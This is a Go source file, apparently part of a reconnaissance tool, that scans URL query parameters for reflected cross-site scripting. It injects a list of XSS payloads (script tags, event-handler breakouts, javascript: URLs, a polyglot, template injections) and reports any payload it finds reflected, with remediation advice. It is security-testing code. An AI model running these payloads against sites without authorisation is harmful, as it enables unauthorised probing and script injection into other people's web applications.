package xss

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// XSS payloads for testing
var xssPayloads = []struct {
	payload     string
	checkString string
	context     string
}{
	// Basic payloads
	{`<script>alert(1)</script>`, `<script>alert(1)</script>`, "HTML"},
	{`<img src=x onerror=alert(1)>`, `<img src=x onerror=alert(1)>`, "HTML"},
	{`<svg onload=alert(1)>`, `<svg onload=alert(1)>`, "HTML"},
	{`<body onload=alert(1)>`, `<body onload=alert(1)>`, "HTML"},

	// Event handlers
	{`" onmouseover="alert(1)"`, `onmouseover="alert(1)"`, "Attribute"},
	{`' onmouseover='alert(1)'`, `onmouseover='alert(1)'`, "Attribute"},
	{`" onfocus="alert(1)" autofocus="`, `onfocus="alert(1)"`, "Attribute"},

	// Breaking out of tags
	{`"><script>alert(1)</script>`, `<script>alert(1)</script>`, "Attribute breakout"},
	{`'><script>alert(1)</script>`, `<script>alert(1)</script>`, "Attribute breakout"},
	{`</title><script>alert(1)</script>`, `<script>alert(1)</script>`, "Tag breakout"},
	{`</textarea><script>alert(1)</script>`, `<script>alert(1)</script>`, "Tag breakout"},

	// JavaScript context
	{`';alert(1)//`, `';alert(1)//`, "JavaScript"},
	{`";alert(1)//`, `";alert(1)//`, "JavaScript"},
	{`</script><script>alert(1)</script>`, `<script>alert(1)</script>`, "Script breakout"},

	// URL context
	{`javascript:alert(1)`, `javascript:alert(1)`, "URL"},
	{`data:text/html,<script>alert(1)</script>`, `data:text/html`, "URL"},

	// Encoded payloads
	{`%3Cscript%3Ealert(1)%3C/script%3E`, `<script>alert(1)</script>`, "URL encoded"},
	{`&lt;script&gt;alert(1)&lt;/script&gt;`, `alert(1)`, "HTML encoded"},

	// Polyglot
	{`jaVasCript:/*-/*\x60/*\\\x60/*'/*"/**/(/* */oNcLiCk=alert() )//`, `onclick=alert`, "Polyglot"},

	// SVG based
	{`<svg/onload=alert(1)>`, `<svg/onload=alert(1)>`, "SVG"},
	{`<svg><script>alert(1)</script></svg>`, `<script>alert(1)</script>`, "SVG script"},

	// Template injection (could also be SSTI)
	{`{{constructor.constructor('alert(1)')()}}`, `constructor.constructor`, "Template"},
	{`${alert(1)}`, `${alert(1)}`, "Template literal"},
}

// Scan performs XSS scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		// Only test URLs with parameters
		if !utils.HasParam(urlStr) {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testXSS(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testXSS(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		for _, test := range xssPayloads {
			result := testPayload(urlStr, param, test.payload, test.checkString, test.context, client)
			if result != nil {
				results = append(results, *result)
				break // Found XSS for this param, move to next
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, checkString, context string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	// Check if payload is reflected
	if strings.Contains(bodyStr, checkString) {
		// Determine severity based on context
		severity := "medium"
		if context == "HTML" || context == "Script breakout" {
			severity = "high"
		}

		// Check if there's any encoding/filtering
		if strings.Contains(bodyStr, payload) {
			severity = "high" // Unfiltered reflection
		}

		return &types.VulnResult{
			Type:        "Cross-Site Scripting (XSS)",
			Severity:    severity,
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    fmt.Sprintf("Payload reflected in response. Context: %s", context),
			Description: fmt.Sprintf("Reflected XSS vulnerability detected in %s context", context),
			Remediation: "Encode all user input before outputting. Use Content-Security-Policy headers. Implement input validation.",
			References: []string{
				"https://owasp.org/www-community/attacks/xss/",
				"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
			},
		}
	}

	return nil
}

// DOM XSS sources and sinks for reference (would need headless browser for full detection)
var domXSSSources = []string{
	"document.URL",
	"document.documentURI",
	"document.URLUnencoded",
	"document.baseURI",
	"location",
	"location.href",
	"location.search",
	"location.hash",
	"location.pathname",
	"document.cookie",
	"document.referrer",
	"window.name",
	"history.pushState",
	"history.replaceState",
	"localStorage",
	"sessionStorage",
}

var domXSSSinks = []string{
	"eval(",
	"setTimeout(",
	"setInterval(",
	"Function(",
	"execScript(",
	"document.write(",
	"document.writeln(",
	"innerHTML",
	"outerHTML",
	"insertAdjacentHTML",
	"onevent",
}
